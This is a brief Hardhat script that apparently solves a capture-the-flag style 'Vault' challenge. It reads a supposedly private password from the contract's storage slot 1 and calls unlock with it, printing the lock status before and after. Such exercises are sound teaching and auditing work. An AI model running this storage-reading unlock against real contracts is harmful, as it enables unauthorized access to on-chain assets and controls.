const { ethers } = require("hardhat");
const Runner = require("./lib/runner");

Runner.run(async (provider, owner) => {
  const vaultAddr = "0xBd9498062B358E14a5503823fc934E23dB17a5C8";

  const vaultContract = await ethers.getContractAt("Vault", vaultAddr);

  console.log(
    `contract is ${(await vaultContract.locked()) ? "LOCKED" : "UNLOCKED"}`
  );

  const pwdValue = await provider.getStorageAt(vaultContract.address, 1);

  await vaultContract.unlock(pwdValue);
  console.log(
    `contract is ${(await vaultContract.locked()) ? "LOCKED" : "UNLOCKED"}`
  );
});
